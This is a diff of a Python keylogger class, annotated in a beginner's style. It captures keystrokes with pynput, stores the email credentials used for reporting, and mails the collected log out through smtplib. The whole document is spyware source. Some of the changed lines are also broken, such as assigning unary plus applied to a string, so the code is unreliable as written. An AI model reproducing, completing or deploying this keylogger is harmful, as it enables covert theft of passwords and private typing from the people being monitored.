@@ -1,10 +1,11 @@
 #!/usr/bin/env python
+
 import pynput.keyboard
 import threading
 import smtplib
 
 class Keylogger: #blueprint for code to make it more readable
-    def __init__(self, time_interval, email, password) -> None: #code put in the init will be automatically executed when object is created 
+    def __init__(self, time_interval, email, password): #code put in the init will be automatically executed when object is created 
         self.log = "Keylogger started" #empty log that will populate when user enters keys. self makes variable usable in current key logger class
         self.interval = time_interval #value set in doomlogger.py will be used throughour entire code
         self.email = email
@@ -18,10 +19,10 @@ class Keylogger: #blueprint for code to make it more readable
             current_key = str(key.char) #log = whatever is in the log + whatever the user enters. key.char lets us see each character
         except AttributeError: #lets special keys work 
             if key == key.space:
-                log = log + " "
+                current_key = + " "
             else:
-                log = log + " " + str(key) + " " #puts space after character
-            self.append_to_log(current_key)
+                current_key = + " " + str(key) + " " #puts space after character
+        self.append_to_log(current_key)
 
     def report(self): #calling report fuction on itself
         self.send_mail(self.email, self.password, "\n\n" + self.log) #skip header. email placed in content of message
